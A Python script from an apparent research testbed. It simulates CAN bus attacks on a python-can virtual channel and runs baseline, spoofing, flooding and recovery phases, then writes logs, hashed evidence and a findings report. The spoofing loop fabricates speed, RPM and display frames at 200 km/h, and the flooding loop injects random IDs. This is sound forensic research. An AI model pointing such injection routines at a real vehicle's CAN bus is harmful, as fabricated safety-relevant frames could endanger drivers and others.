#!/usr/bin/env python3
from __future__ import annotations

import csv
import hashlib
import json
import math
import random
import statistics
import sys
import time
from collections import Counter, defaultdict
from datetime import datetime, timezone
from pathlib import Path

import can

OUT = Path(__file__).resolve().parent
CHANNEL = 'ssv2026-attack-virtual-can'


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open('rb') as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b''):
            h.update(chunk)
    return h.hexdigest()


def msg(arbitration_id: int, data: list[int]) -> can.Message:
    return can.Message(arbitration_id=arbitration_id, is_extended_id=False, data=bytearray(data), timestamp=time.time())


def send(bus, phase: str, m: can.Message, writer, raw_f, start: float, note: str=''):
    bus.send(m, timeout=0.2)
    ts = time.time()
    rel = ts - start
    data_hex = m.data.hex().upper()
    raw_f.write(f'({ts:.6f}) vcan_sim {m.arbitration_id:03X}#{data_hex} phase={phase} note={note}\n')
    writer.writerow({
        'wall_ts': f'{ts:.6f}',
        'relative_s': f'{rel:.6f}',
        'phase': phase,
        'arbitration_id_hex': f'{m.arbitration_id:X}',
        'dlc': len(m.data),
        'data_hex': data_hex,
        'note': note,
    })


def speed_payload(speed: int, rpm: int=1800, throttle: int=30, temp: int=86, fuel: int=75):
    return [speed & 0xFF, (speed >> 8) & 0xFF, rpm & 0xFF, (rpm >> 8) & 0xFF, throttle, temp, fuel, 0]


def decode_speed_from_0x100(data_hex: str):
    b = bytes.fromhex(data_hex)
    if len(b) >= 2:
        return b[0] | (b[1] << 8)
    return None


def main() -> int:
    raw_path = OUT / 'output_candump_annotated.log'
    csv_path = OUT / 'output_frames.csv'
    input_path = OUT / 'input_attack_plan.json'
    findings_path = OUT / 'findings.json'
    report_path = OUT / 'findings.md'
    manifest_path = OUT / 'manifest.json'

    attack_plan = {
        'experiment_id': '005_real_attack_software',
        'scope': 'Authorized 100% software CAN attack simulation using python-can virtual backend; no physical vehicle or ECU.',
        'channel': CHANNEL,
        'interface': 'python-can virtual',
        'phases': [
            {'name': 'baseline', 'duration_s': 5, 'description': 'Normal simulated ECU traffic: IDs 0x100, 0x120, 0x188, 0x300.'},
            {'name': 'spoofing', 'duration_s': 3, 'description': 'Fabricated speed frames on ID 0x100 and display-related ID 0x188; speed forced to 200 km/h.'},
            {'name': 'flooding', 'duration_s': 3, 'description': 'Controlled high-rate fabrication using random IDs and payloads.'},
            {'name': 'recovery', 'duration_s': 2, 'description': 'Return to normal simulated ECU traffic.'},
        ],
        'spoof': {'speed_kmh': 200, 'ids': ['0x100', '0x188'], 'period_s': 0.02},
        'flood': {'period_s': 0.002, 'duration_s': 3, 'id_range': '0x001-0x7FE'},
        'safety': 'Software-only virtual CAN. No hardware. No external target. No persistence beyond saved logs.',
        'created_utc': now_iso(),
    }
    input_path.write_text(json.dumps(attack_plan, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')

    start = time.time()
    rng = random.Random(20260603)
    with can.Bus(interface='virtual', channel=CHANNEL, receive_own_messages=True) as bus, \
         raw_path.open('w', encoding='utf-8') as raw_f, \
         csv_path.open('w', newline='', encoding='utf-8') as csv_f:
        writer = csv.DictWriter(csv_f, fieldnames=['wall_ts','relative_s','phase','arbitration_id_hex','dlc','data_hex','note'])
        writer.writeheader()

        # Baseline
        end = time.time() + 5
        tick = 0
        while time.time() < end:
            elapsed = time.time() - start
            speed = int(60 + 20 * math.sin(elapsed * 1.1))
            rpm = int(1700 + 500 * math.sin(elapsed * 1.7))
            send(bus, 'baseline', msg(0x100, speed_payload(speed, rpm)), writer, raw_f, start, 'engine_cluster_state')
            send(bus, 'baseline', msg(0x120, [0,0,0,0,0,0,0,0]), writer, raw_f, start, 'body_status')
            send(bus, 'baseline', msg(0x188, [0,0,speed & 0xFF,(speed>>8)&0xFF,0,0,0,0]), writer, raw_f, start, 'display_speed')
            if tick % 5 == 0:
                send(bus, 'baseline', msg(0x300, [rng.randrange(256) for _ in range(8)]), writer, raw_f, start, 'background_noise')
            tick += 1
            time.sleep(0.05)

        # Spoofing / fabrication
        end = time.time() + 3
        while time.time() < end:
            speed = 200
            send(bus, 'spoofing', msg(0x100, speed_payload(speed, rpm=4500, throttle=95, temp=90, fuel=74)), writer, raw_f, start, 'ATTACK fabricated speed/rpm/throttle')
            send(bus, 'spoofing', msg(0x188, [0,0,speed & 0xFF,(speed>>8)&0xFF,0xAA,0,0,0]), writer, raw_f, start, 'ATTACK display spoof')
            time.sleep(0.02)

        # Flooding controlled
        end = time.time() + 3
        while time.time() < end:
            arb = rng.randrange(0x001, 0x7FE)
            payload = [rng.randrange(256) for _ in range(8)]
            send(bus, 'flooding', msg(arb, payload), writer, raw_f, start, 'ATTACK controlled flooding')
            time.sleep(0.002)

        # Recovery
        end = time.time() + 2
        while time.time() < end:
            elapsed = time.time() - start
            speed = int(55 + 10 * math.sin(elapsed))
            send(bus, 'recovery', msg(0x100, speed_payload(speed, 1600)), writer, raw_f, start, 'normal_after_attack')
            send(bus, 'recovery', msg(0x188, [0,0,speed & 0xFF,(speed>>8)&0xFF,0,0,0,0]), writer, raw_f, start, 'display_speed_recovery')
            time.sleep(0.05)

    # Analyze
    rows = []
    with csv_path.open(newline='', encoding='utf-8') as f:
        for row in csv.DictReader(f):
            rows.append(row)
    phase_counts = Counter(r['phase'] for r in rows)
    id_counts = Counter(r['arbitration_id_hex'] for r in rows)
    speeds_by_phase = defaultdict(list)
    for r in rows:
        if r['arbitration_id_hex'] == '100':
            sp = decode_speed_from_0x100(r['data_hex'])
            if sp is not None:
                speeds_by_phase[r['phase']].append(sp)

    duration = float(rows[-1]['relative_s']) if rows else 0.0
    findings = {
        'experiment_id': '005_real_attack_software',
        'started_utc': attack_plan['created_utc'],
        'ended_utc': now_iso(),
        'total_duration_s': duration,
        'total_frames': len(rows),
        'phase_counts': dict(phase_counts),
        'top_ids': id_counts.most_common(15),
        'speed_stats_by_phase_for_id_0x100': {
            phase: {
                'count': len(vals),
                'min': min(vals),
                'max': max(vals),
                'mean': round(statistics.mean(vals), 2),
            } for phase, vals in speeds_by_phase.items() if vals
        },
        'observations': [
            'Baseline generated stable periodic IDs 0x100, 0x120 and 0x188 plus low-rate background ID 0x300.',
            'Spoofing phase forced decoded speed on ID 0x100 to 200 km/h and increased RPM/throttle fields, demonstrating fabrication of safety-relevant state in an unauthenticated CAN-like stream.',
            'Flooding phase injected high-cardinality random arbitration IDs, increasing frame volume and noise for forensic triage.',
            'Recovery phase returned speed values to normal range, allowing before/during/after comparison.',
            'Because this run used python-can virtual backend, findings are valid for software workflow, logging, replay and forensic pipeline, but not for physical-layer arbitration, transceiver errors, bus load saturation or electrical fault behavior.',
        ],
        'files': {
            'input_attack_plan.json': {'sha256': sha256_file(input_path), 'bytes': input_path.stat().st_size},
            'output_candump_annotated.log': {'sha256': sha256_file(raw_path), 'bytes': raw_path.stat().st_size},
            'output_frames.csv': {'sha256': sha256_file(csv_path), 'bytes': csv_path.stat().st_size},
        },
    }
    findings_path.write_text(json.dumps(findings, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')

    report = f'''# Findings — Experiment 005: 100% Software CAN Attack

## Escopo

The attack was executed in an authorized, 100% software environment using the `python-can` virtual backend. No vehicle, physical ECU, external network, or hardware was involved.

## Inputs

- Plan: `input_attack_plan.json`
- Canal virtual: `{CHANNEL}`
- Fases: baseline, spoofing/fabrication, flooding controlado e recovery.

## Outputs

- Log bruto anotado: `output_candump_annotated.log`
- Frames normalizados: `output_frames.csv`
- Findings JSON: `findings.json`
- Manifesto: `manifest.json`

## Resultados quantitativos

- Total duration: {duration:.3f} s
- Frames totais: {len(rows)}
- Frames por fase: `{dict(phase_counts)}`
- IDs mais frequentes: `{id_counts.most_common(10)}`

## Decoded speed on ID 0x100

```json
{json.dumps(findings['speed_stats_by_phase_for_id_0x100'], indent=2, ensure_ascii=False)}
```

## Main findings

1. The baseline generated stable periodic traffic on IDs `0x100`, `0x120`, and `0x188`.
2. The spoofing phase fabricated vehicle state on ID `0x100`, forcing the decoded speed to **200 km/h**.
3. Frame `0x188` was used as a didactic display-related signal, separating vehicle-state traffic from dashboard/display traffic.
4. The flooding phase substantially increased ID diversity and frame volume, creating noise for forensic triage.
5. The recovery phase showed a return to the normal pattern, enabling before/during/after comparison.

## Scientific limitation

Because the execution used a virtual backend, it validates the software pipeline, logging, replay, preservation, and analysis workflow. It does **not** measure CAN electrical arbitration, physical bus saturation, transceiver errors, termination effects, or real ECU behavior.

## Use in the paper

This experiment can be used as a proof of concept for the software-defined testbed: zero-cost execution, reproducible workflow, hash-preserved evidence, and documented attack scenarios.
'''
    report_path.write_text(report, encoding='utf-8')

    manifest = {
        'schema': 'software-can-testbed.attack-run.v1',
        'experiment_id': '005_real_attack_software',
        'created_utc': now_iso(),
        'python': sys.version,
        'python_can_version': can.__version__,
        'files': {
            'input_attack_plan.json': {'sha256': sha256_file(input_path), 'bytes': input_path.stat().st_size},
            'output_candump_annotated.log': {'sha256': sha256_file(raw_path), 'bytes': raw_path.stat().st_size},
            'output_frames.csv': {'sha256': sha256_file(csv_path), 'bytes': csv_path.stat().st_size},
            'findings.json': {'sha256': sha256_file(findings_path), 'bytes': findings_path.stat().st_size},
            'findings.md': {'sha256': sha256_file(report_path), 'bytes': report_path.stat().st_size},
        },
    }
    manifest_path.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')

    print(json.dumps(findings, indent=2, ensure_ascii=False))
    return 0

if __name__ == '__main__':
    raise SystemExit(main())
